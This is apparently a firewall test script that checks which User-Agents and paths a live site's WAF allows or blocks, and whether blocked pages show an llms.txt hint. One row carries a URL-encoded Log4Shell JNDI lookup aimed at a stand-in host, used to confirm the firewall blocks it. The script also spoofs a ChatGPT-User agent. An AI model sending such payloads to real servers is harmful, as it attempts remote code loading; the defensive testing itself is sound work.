"""Requests against the live site that show what the WAF does, run before and after a change.

The User-Agents below are spoofed from wherever this runs, so they are all *unverified*:
the AI-named row must be blocked both before and after. The verified case can only be
seen in the WAF and ALB logs. These requests land in the WAF log under the operator's IP;
check that before reading them as outside traffic.
"""
import urllib.error
import urllib.request

BROWSER = ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 '
           '(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36')
CURL = 'curl/8.5.0'
REQUESTS = 'python-requests/2.32.3'
CHATGPT_USER = ('Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; '
                'ChatGPT-User/1.0; +https://openai.com/bot')
JNDI = '/robots.txt?x=%24%7Bjndi%3Aldap%3A%2F%2Fx.example.com%2Fa%7D'

# (what it shows, path, user agent, expected status, blocked by a rule that carries the hint)
ROWS = [
    ('a browser gets the home page', '/', BROWSER, 200, False),
    ('curl gets the API index', '/api/v1/', CURL, 200, False),
    ('curl gets llms.txt', '/llms.txt', CURL, 200, False),
    ('python-requests gets robots.txt', '/robots.txt', REQUESTS, 200, False),
    ('curl is blocked from pages', '/', CURL, 403, True),
    ('python-requests is blocked from pages', '/project/', REQUESTS, 403, True),
    ('an unverified ChatGPT-User is blocked', '/', CHATGPT_USER, 403, True),
    ('an exploit payload on an allowed path stays blocked', JNDI, BROWSER, 403, False),
]

HINT_MARKER = '/llms.txt'


def fetch(url, user_agent, timeout=25):
    request = urllib.request.Request(url, headers={'User-Agent': user_agent})
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.status, response.read(4096).decode('utf-8', 'replace')
    except urllib.error.HTTPError as error:
        return error.code, error.read(4096).decode('utf-8', 'replace')


def run(host, expect_hint=None, fetch=fetch):
    """Print one line per row; return the number of rows that did not behave as expected.

    expect_hint: True after the hint ships, False before it, None to only report it.
    """
    failures = 0
    for label, path, user_agent, status, hinted in ROWS:
        got, body = fetch(host.rstrip('/') + path, user_agent)
        has_hint = got == 403 and HINT_MARKER in body
        wrong = []
        if got != status:
            wrong.append(f'expected {status}')
        if got == 403 and expect_hint is not None:
            if has_hint != (expect_hint and hinted):
                wrong.append('hint expected' if not has_hint else 'hint not expected')
        failures += bool(wrong)
        hint = ' +hint' if has_hint else ''
        print(f'  {"FAIL" if wrong else "ok  "}  {got}{hint:<6}  {label}'
              + (f'   <-- {"; ".join(wrong)}' if wrong else ''))
    return failures
